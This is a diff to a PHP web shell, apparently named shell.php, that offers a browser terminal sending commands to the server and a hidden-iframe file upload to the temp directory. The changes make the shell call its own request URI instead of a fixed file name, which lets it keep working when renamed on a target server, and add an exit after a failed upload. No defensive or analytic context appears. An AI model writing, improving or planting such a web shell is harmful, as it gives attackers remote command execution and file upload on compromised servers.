@@ -17,6 +17,7 @@
             {
                 echo "<textarea style='color:white;'>$name: Failure!</textarea>";
             }
+            exit();
             
         }
 	else
@@ -209,7 +210,7 @@ function updateData(param)
   	
 	document.form1.output.value+= "$: " + param + "\n";
 	document.form1.output.scrollTop = document.form1.output.scrollHeight;
-  	var myurl = "./shell.php";
+  	var myurl = "./" + <?php echo "\"" . $_SERVER['REQUEST_URI']. "\""; ?>
 
 	http.open("GET", myurl + "?id=" + escape(param), true);
 	http.onreadystatechange = useHttpResponse;
@@ -230,7 +231,7 @@ function fileUploadBox() {
   uploadDiv.setAttribute("align","center");
   uploadDiv.id="upload_box";
   uploadDiv.className = "popup"; 
-  uploadDiv.innerHTML="<form id='file_upload' method='post' enctype='multipart/form-data' target='uploader'><input name='file' id='file' type='file' /><br /><input type='submit' name='action' value='Upload to <?php echo htmlentities($_SERVER['TEMP']?$_SERVER['TEMP']:"/tmp"); ?>' style='border:1px solid white;'/><br /><iframe name='uploader' id='uploader' src='shell.php' width='0' height='0' style='display:none;'></iframe></form><button name='close_button' class='button' type='button' style='height:3em;width:30%;' onclick='var element = document.getElementById(\"upload_box\"); element.parentNode.removeChild(element);' readonly=true>Close!</button>";
+  uploadDiv.innerHTML="<form id='file_upload' method='post' enctype='multipart/form-data' target='uploader'><input name='file' id='file' type='file' /><br /><input type='submit' name='action' value='Upload to <?php echo htmlentities($_SERVER['TEMP']?$_SERVER['TEMP']:"/tmp"); ?>' style='border:1px solid white;'/><br /><iframe name='uploader' id='uploader' src='<?php echo "./" . $_SERVER['REQUEST_URI'];?>' width='0' height='0' style='display:none;'></iframe></form><button name='close_button' class='button' type='button' style='height:3em;width:30%;' onclick='var element = document.getElementById(\"upload_box\"); element.parentNode.removeChild(element);' readonly=true>Close!</button>";
   document.body.appendChild(uploadDiv);
    
 }
